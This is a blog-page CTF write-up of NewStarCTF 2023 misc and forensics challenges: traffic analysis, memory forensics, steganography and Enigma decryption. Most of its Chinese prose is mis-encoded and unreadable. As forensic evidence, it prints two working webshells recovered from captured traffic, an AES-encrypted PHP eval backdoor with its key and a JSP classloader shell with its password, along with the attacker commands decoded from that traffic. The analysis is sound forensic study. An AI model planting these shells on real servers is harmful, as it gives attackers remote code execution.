<p>é¡ºç€ä¸Šä¸€æ¬¡çš„è·Ÿè¸ªï¼Œæœç´¢ä¸Šæ¬¡çš„webshellæ–‡ä»¶<code>wh1t3g0d.php</code><br>æˆ–è€…ï¼Œ<code>http.request.uri.path contains &quot;wh1t3g0d.php&quot;</code>ï¼Œä¹Ÿå¯ä»¥æ‰¾ä¸€ä¸‹postçš„è¯·æ±‚<code>http.request.method == POST</code><br>å‘ç°åˆå†™å…¥äº†<code>shell.php</code>ï¼Œå†æœç´¢ä¸€æ¬¡<br>é€šè¿‡ä¸æ–­åœ°è¿½è¸ªhttpæµï¼Œå‘ç°äº†<br><img src="https://pic1.zhimg.com/80/v2-3c161ad928303e835e94c62ff9138670_1440w.png" alt=""><br>è°ƒç”¨file_put_contentså†™å…¥äº†ä¸€ä¸ª1.phpæ–‡ä»¶ï¼ŒåŒæ—¶base64è§£ç å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<p>ç§˜é’¥<code>e45e329feb5d925b</code>ï¼Œæµé‡é‡‡ç”¨<code>AES128</code>åŠ å¯†<br>åç»­çš„äº¤äº’éœ€è¦é€šè¿‡<code>1.php</code>å®ç°ï¼ŒæŠŠæ‰€æœ‰1.phpçš„å“åº”æµé‡è¿‡æ»¤å‡ºæ¥<br><code>http.response_for.uri contains &quot;/1.php&quot;</code>ï¼Œå¯¼å‡ºç‰¹å®šåˆ†ç»„ä¿å­˜</p>
<p>é€šè¿‡è¿½è¸ªæµï¼Œæ¥è§£AESçš„åŠ å¯†å¯†æ–‡ï¼Œ<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/cryptoaes/">http://tools.bugscaner.com/cryptoaes/</a><br><img src="https://picx.zhimg.com/80/v2-196615fa20bdf7f3a44438d3c0102937_1440w.png" alt=""><br>è§£å‡ºçš„éƒ½æ˜¯jsonæ ¼å¼ï¼ŒçŠ¶æ€ä¸€èˆ¬éƒ½æ˜¯<code>success</code>ï¼Œé‡ç‚¹æ˜¯<code>msg</code><br>å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">OLDPWD=/<span class="keyword">var</span>/www/html</span><br><span class="line">APACHE_RUN_DIR=/<span class="keyword">var</span>/run/apache2</span><br><span class="line">APACHE_PID_FILE=/<span class="keyword">var</span>/run/apache2/apache2.pid</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">APACHE_LOCK_DIR=/<span class="keyword">var</span>/lock/apache2</span><br><span class="line">LANG=C</span><br><span class="line">APACHE_RUN_USER=www-data</span><br><span class="line">APACHE_RUN_GROUP=www-data</span><br><span class="line">APACHE_LOG_DIR=/<span class="keyword">var</span>/log/apache2</span><br><span class="line">PWD=/<span class="keyword">var</span>/www/html</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥ï¼Œç”¨æˆ·æ˜¯<code>www-data</code><br><img src="https://picx.zhimg.com/80/v2-196615fa20bdf7f3a44438d3c0102937_1440w.png" alt=""><br>å¾—åˆ°æœåŠ¡å™¨å†…ç½‘IPï¼Œ<code>172.17.0.2</code><br>ä¸æ­¢æ˜¯è¿™ä¸¤ä¸ªåŒ…ï¼Œå…¶ä»–çš„ä¹Ÿæœ‰</p>
<p>æ€»çš„æ¥è¯´ï¼Œåé¢çš„æ“ä½œå°±æ˜¯ä¸æ–­è¿½è¸ªhttpæµï¼Œè§£AESå¯†æ–‡ï¼Œå†base64æ‰¾ä¿¡æ¯<br>æ€»å…±19ç»„å§ï¼Œè¿½è¸ªhttpæµä¹‹å‰ï¼Œç‚¹å‡»å®ƒï¼Œä½ å¯ä»¥å‘ç°åŒä¸€ç»„çš„æµé‡å·¦ä¾§ä¼šæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„è·¨åº¦</p>
<h3 id="ç¬¬ä¸€æ¬¡å–è¯"><a href="#ç¬¬ä¸€æ¬¡å–è¯" class="headerlink" title="ç¬¬ä¸€æ¬¡å–è¯"></a>ç¬¬ä¸€æ¬¡å–è¯</h3><p>å…ˆä¸‹è½½<code>volatility</code>ï¼Œéœ€è¦Python2çš„ç¯å¢ƒ<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38603541/article/details/129244112">https://blog.csdn.net/qq_38603541/article/details/129244112</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/117304586">https://blog.csdn.net/qq_42880719/article/details/117304586</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22406677/article/details/134596477">https://blog.csdn.net/qq_22406677/article/details/134596477</a><br>emmmmï¼Œæˆ‘çš„æœ‰ä¸€ç‚¹å°é—®é¢˜ï¼Œ<code>volatility</code>æŒ‡ä»¤ç”¨ä¸äº†ï¼Œå¾—æ¢ä¸ªæ–¹æ³•<br>æŠŠ<code>dycqz.raw</code>æ‹–å…¥<code>volatility</code>æ–‡ä»¶å¤¹ï¼Œåœ¨æ­¤æ‰“å¼€ç»ˆç«¯</p>
<p>imageinfoï¼šåˆ†æè·å–å†…å­˜é•œåƒçš„åŸºæœ¬ä¿¡æ¯<br><code>vol.py -f dycqz.raw imageinfo</code></p>
<p>pslistï¼šæŸ¥çœ‹é•œåƒä¸­æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹<br><code>vol.py -f dycqz.raw --profile=Win7SP1x64 pslist</code></p>
<p>æŸ¥çœ‹notepadè¿›ç¨‹<br><code>vol.py -f dycqz.raw --profile=Win7SP1x64 editbox</code><br>å¾—åˆ°å­—ç¬¦ä¸²</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@iH&lt;,&#123;BTrI;(N`j&amp;z+xcj9XE2!u/YbR:<span class="number">4</span>gb2+ceDJs@u6P</span><br></pre></td></tr></table></figure>
<p>éšæ³¢é€æµå¾—åˆ°ï¼Œbase91</p>
<h2 id="week5-2"><a href="#week5-2" class="headerlink" title="week5"></a>week5</h2><h3 id="éšç§˜çš„å›¾ç‰‡"><a href="#éšç§˜çš„å›¾ç‰‡" class="headerlink" title="éšç§˜çš„å›¾ç‰‡"></a>éšç§˜çš„å›¾ç‰‡</h3><p>ä¸¤å¼ äºŒç»´ç ï¼Œæœ‰ä¸€å¼ è¿˜æ˜¯æŸåçš„ï¼Œä½†å®Œæ•´é‚£å¼ æ˜¯æœ‰ç”¨çš„ï¼Œæƒ³åˆ°å¼‚æˆ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File Format:æ–‡ä»¶æ ¼å¼</span><br><span class="line">Data Extract:æ•°æ®æå–</span><br><span class="line">Steregram Solve:ç«‹ä½“è¯•å›¾ å¯ä»¥å·¦å³æ§åˆ¶åç§»</span><br><span class="line">Frame Browser:å¸§æµè§ˆå™¨</span><br><span class="line">Image Combiner:æ‹¼å›¾ï¼Œå›¾ç‰‡æ‹¼æ¥</span><br></pre></td></tr></table></figure>
<p>emmmï¼Œç»ˆäºè§£é”<code>stegsolve</code>çš„æœ€åä¸€ä¸ªç”¨æ³•äº†</p>
<h3 id="ezhard"><a href="#ezhard" class="headerlink" title="ezhard"></a>ezhard</h3><p>ç£ç›˜å–è¯ï¼Œå¯ä»¥ç”¨7zé€ƒè¯¾ï¼Œ<code>hint.png</code>å°±æ˜¯flag</p>
<p>å®˜æ–¹åšæ³•æ˜¯ï¼Œä½¿ç”¨åˆ°Linux<br><code>file ezhard</code>ï¼Œå‘ç°æ˜¯ç¡¬ç›˜æ ¼å¼æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–°å»ºç›®å½•æŒ‚è½½ï¼Œrootæƒé™ä¸‹</span><br><span class="line">mkdir newstarctf</span><br><span class="line">mount ezhard newstarctf/</span><br></pre></td></tr></table></figure>
<p>æˆ‘è¯•è¿‡è¿™æ ·åšï¼Œå¾—åˆ°çš„<code>hint.png</code>æ˜¯æŸåçš„ï¼Œemmmm</p>
<h3 id="æ–°å»ºPythonæ–‡ä»¶"><a href="#æ–°å»ºPythonæ–‡ä»¶" class="headerlink" title="æ–°å»ºPythonæ–‡ä»¶"></a>æ–°å»ºPythonæ–‡ä»¶</h3><p>pycåç¼–è¯‘<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br>åç¼–è¯‘å‡ºæ¥çš„pyæ–‡ä»¶æ²¡ä»€ä¹ˆç”¨<br>è¯•ä¸€ä¸‹ï¼Œpycæ–‡ä»¶éšå†™<br><a target="_blank" rel="noopener" href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a><br>æˆ‘çš„è¯„ä»·æ˜¯ï¼Œä¸‹ä¸€ä¸ªPython3.6çš„ç‰ˆæœ¬ï¼Œæˆ‘å°±ä¸‹äº†3.66<br><a href="https://link.zhihu.com/?target=https%3A//www.python.org/ftp/python/3.6.6/python-3.6.6-embed-amd64.zip">https://link.zhihu.com/?target=https%3A//www.python.org/ftp/python/3.6.6/python-3.6.6-embed-amd64.zip</a><br>ç„¶åä¿®æ”¹ç¯å¢ƒè·¯å¾„å°±å¯ä»¥äº†ï¼ŒæŠŠ<code>flag.pyc</code>æ‹–å…¥æ–‡ä»¶å¤¹<br><code>python stegosaurus.py -x flag.pyc</code></p>
<p>å„ç‰ˆæœ¬ä¸‹è½½<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/601465835">https://zhuanlan.zhihu.com/p/601465835</a></p>
<h3 id="BabyAntSword"><a href="#BabyAntSword" class="headerlink" title="BabyAntSword"></a>BabyAntSword</h3><p>åˆæ˜¯æµé‡åˆ†æï¼Œä¸è¿‡æ˜¯èšå‰‘æµé‡<br>å¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°æ–‡ä»¶ä¸Šä¼ ï¼Œä¹Ÿå¯ä»¥è¿‡æ»¤å‡ºpostè¯·æ±‚(æœ¬é¢˜æ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼ ï¼Œåé¢è‚¯å®šè¿˜è¦ç”¨åˆ°ï¼Œ<code>http.request.method == POST</code>)<br>å‘ç°<br><img src="https://picx.zhimg.com/80/v2-f18a54551da6640e1cedd56b5018a868_1440w.png" alt=""><br>æŸ¥çœ‹<br><img src="https://picx.zhimg.com/80/v2-4f184480866e41ad5253e7b5156ec15a_1440w.png" alt=""><br>å¯¼å‡ºå‹ç¼©åŒ…<br><img src="https://picx.zhimg.com/80/v2-18366022ae36f7e58195daf59c6afe64_1440w.png" alt=""><br>æˆ‘ç”¨çš„<code>winhex</code><br>æ‰“å¼€jsp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;n3wst4r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°webshellå¯†ç ï¼Œ<code>n3wst4r</code>ï¼Œå¥½å§è™½ç„¶æˆ‘ä¹Ÿä¸æ‡‚ï¼Œæ˜¯å°±æ˜¯å§<br>è¿‡æ»¤postè¯·æ±‚ï¼Œç»§ç»­è¿½è¸ªï¼Œæ ¹æ®èšå‰‘çš„ç‰¹æ€§ï¼Œä¼ å‚çš„ç¬¬ä¸‰ä½å¼€å§‹æ‰æ˜¯çœŸæ­£çš„å‚æ•°ï¼Œå°†å…¶å¤åˆ¶base64è§£ç </p>
<p>æ‰¾åˆ°<code>tcp.stream eq 39</code><br>è¯·æ±‚æŠ¥æ–‡<br><code>Y2QgIi91c3IvbG9jYWwvdG9tY2F0IjtlbnY7ZWNobyBmNWNkOTtwd2Q7ZWNobyAwYTI1ZmJjMWM1</code>ï¼Œå¾—åˆ°ï¼Œ<code>cd &quot;/usr/local/tomcat&quot;;env;echo f5cd9;pwd;echo 0a25fbc1c5</code>ï¼Œæ‰¾åˆ°äº†<code>env</code>ï¼Œè¿™é‡Œæ‰§è¡Œäº†<code>env</code>æŒ‡ä»¤<br>å“åº”æŠ¥æ–‡<br>å‰”é™¤äº†ç¬¬ä¸€è¡Œçš„ä¸ç­‰é•¿<br><img src="https://picx.zhimg.com/80/v2-ed58a3d080cc042ab0a3b0343f321cba_1440w.png" alt=""><br>å¾—åˆ°Javaç‰ˆæœ¬<code>7u121</code></p>
<p><code>tcp.stream eq 43</code><br>æ‰¾åˆ°<br><code>Y2QgIi91c3IvbG9jYWwvdG9tY2F0IjtjYXQgLy5zZWNyZXQ7ZWNobyBmNWNkOTtwd2Q7ZWNobyAwYTI1ZmJjMWM1</code><br>å³<br><code>cd &quot;/usr/local/tomcat&quot;;cat /.secret;echo f5cd9;pwd;echo 0a25fbc1c5</code><br>æŸ¥çœ‹å“åº”çš„<code>/.secret</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7c5e498eYzU4NTBhMGMtZGMwMy0xZGIyLTQzMDMtNDNkNmZkZjI3OTg1DQpmNWNkOQ0KL3Vzci9sb2NhbC90</span><br><span class="line">b21jYXQNCjBhMjVmYmMxYzUNCg==bdf33c892c47</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ï¼Œ<code>c5850a0c-dc03-1db2-4303-43d6fdf27985</code><br>flagç¬¬ä¸‰æ®µæ˜¯æ”»å‡»è€…åˆ é™¤çš„æ–‡ä»¶å†…å®¹ï¼Ÿæ²¡çœ‹å‡ºæ€ä¹ˆåˆ é™¤çš„ï¼Œemmm</p>
<h3 id="Easymem"><a href="#Easymem" class="headerlink" title="Easymem"></a>Easymem</h3><p>åˆæ˜¯å†…å­˜å–è¯<br>emmmmï¼Œæˆ‘<code>volatility</code>æ’ä»¶é…ä¸å¥½ï¼Œæ”¾å¼ƒäº†<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mar10/p/17813974.html">https://www.cnblogs.com/Mar10/p/17813974.html</a></p>
<h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>æ©å°¼æ ¼ç æœº<br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/28397034/answer/41739506">https://www.zhihu.com/question/28397034/answer/41739506</a><br>æ™•ï¼Œé€ƒäº†<br>è´´ä¸ªå®˜æ–¹è„šæœ¬ï¼ŒEnigmaMachineçˆ†ç ´</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> enigma.machine <span class="keyword">import</span> EnigmaMachine</span><br><span class="line">reflectors = [<span class="string">&#x27;B-Thin&#x27;</span>, <span class="string">&#x27;C-Thin&#x27;</span>]</span><br><span class="line">rotors = [<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;II&#x27;</span>, <span class="string">&#x27;III&#x27;</span>, <span class="string">&#x27;IV&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;VI&#x27;</span>, <span class="string">&#x27;VII&#x27;</span>, <span class="string">&#x27;VIII&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> r1, r2, r3 <span class="keyword">in</span> [(r1, r2, r3) <span class="keyword">for</span> r1 <span class="keyword">in</span> rotors <span class="keyword">for</span> r2 <span class="keyword">in</span> rotors <span class="keyword">for</span> r3 <span class="keyword">in</span> rotors]:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> reflectors:</span><br><span class="line">        <span class="keyword">for</span> a, b <span class="keyword">in</span> [(a, b) <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>)]:</span><br><span class="line">            machine = EnigmaMachine.from_key_sheet(</span><br><span class="line">                rotors=<span class="string">&#x27; &#x27;</span>.join([r1, r2, r3]),</span><br><span class="line">                reflector=r,</span><br><span class="line">                ring_settings=[a, <span class="number">15</span>, b],</span><br><span class="line">                plugboard_settings=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            temp = machine.process_text(</span><br><span class="line">                <span class="string">&#x27;uwdhwalkbuzwewhcaaepxnqsvfvkohskkspolrnswdfcbnn&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> temp.startswith(<span class="string">&quot;FLAG&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(temp, r1, r2, r3, r)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>å¥½å®¶ä¼™ï¼Œè¿™åº“è²Œä¼¼æ²¡æœ‰ï¼Ÿåæ­£æˆ‘æ²¡ä¸‹åˆ°</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿˜æ²¡å¼€å§‹å†™ï¼ŒWebé¢˜å¥½å¤šå•Šï¼Œæ²¡è¡¥å®ŒQWQ</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://hvang10.github.io">HvAng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/">https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/02/LitCTF2024/" title="LitCTF2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">LitCTF2024</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/08/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/" title="å¤ç°è®¡åˆ’â€”â€”DASCTF X GFCTF 2024ï½œå››æœˆå¼€å¯ç¬¬ä¸€å±€"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">å¤ç°è®¡åˆ’â€”â€”DASCTF X GFCTF 2024ï½œå››æœˆå¼€å¯ç¬¬ä¸€å±€</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HvAng</div><div class="author-info__description">Just keep learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HvAng10"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is HvAng, a new star CTFer!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1"><span class="toc-number">1.1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">æ³„æ¼çš„ç§˜å¯†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-Upload"><span class="toc-number">1.1.2.</span> <span class="toc-text">Begin of Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-HTTP"><span class="toc-number">1.1.3.</span> <span class="toc-text">Begin of HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ErrorFlask"><span class="toc-number">1.1.4.</span> <span class="toc-text">ErrorFlask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Begin-of-PHP"><span class="toc-number">1.1.5.</span> <span class="toc-text">Begin of PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.6.</span> <span class="toc-text">R!C!E!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyLogin"><span class="toc-number">1.1.7.</span> <span class="toc-text">EasyLogin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2"><span class="toc-number">1.2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">æ¸¸æˆé«˜æ‰‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-0%E3%80%820"><span class="toc-number">1.2.2.</span> <span class="toc-text">include 0ã€‚0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-sql"><span class="toc-number">1.2.3.</span> <span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialize%EF%BC%9F"><span class="toc-number">1.2.4.</span> <span class="toc-text">Unserializeï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-again"><span class="toc-number">1.2.5.</span> <span class="toc-text">Upload again!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E-1"><span class="toc-number">1.2.6.</span> <span class="toc-text">R!!C!!E!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">1.3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Include-%F0%9F%8D%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">Include ğŸ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium-sql"><span class="toc-number">1.3.2.</span> <span class="toc-text">medium_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-Gadget"><span class="toc-number">1.3.3.</span> <span class="toc-text">POP Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">R!!!C!!!E!!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GenShin"><span class="toc-number">1.3.5.</span> <span class="toc-text">GenShin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OtenkiGirl"><span class="toc-number">1.3.6.</span> <span class="toc-text">OtenkiGirl()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-number">1.4.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83"><span class="toc-number">1.4.1.</span> <span class="toc-text">é€ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#More-Fast"><span class="toc-number">1.4.2.</span> <span class="toc-text">More Fast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#midsql"><span class="toc-number">1.4.3.</span> <span class="toc-text">midsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-disk"><span class="toc-number">1.4.4.</span> <span class="toc-text">flask disk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InjectMe"><span class="toc-number">1.4.5.</span> <span class="toc-text">InjectMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PharOne"><span class="toc-number">1.4.6.</span> <span 